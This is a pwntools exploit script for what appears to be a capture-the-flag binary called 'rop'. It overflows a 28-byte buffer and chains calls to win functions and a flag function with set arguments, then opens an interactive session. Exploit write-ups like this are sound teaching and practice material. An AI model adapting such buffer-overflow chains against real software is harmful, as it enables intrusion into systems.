from pwn import *

# -------------------------------------------
# rop chain
# win_function1() -> win_function2(0xBAAAAAAD) -> flag(0xDEADBAAD)
# -------------------------------------------

b = ELF('./rop')

win1_addr = 0x80485cb
win2_addr = 0x80485d8
arg1 = 0xBAAAAAAD
arg2 = 0xDEADBAAD
flag_addr = 0x804862b
bof_offset = 28
pop1ret = 0x080485d6

p = process('./rop')

payload = 'A' * bof_offset
payload += p32(win1_addr)
payload += p32(win2_addr)
payload += p32(pop1ret)
payload += p32(arg1)
payload += p32(flag_addr)
payload += "BBBB"
payload += p32(arg2)

p.recv(1048)
p.sendline(payload)

p.interactive()

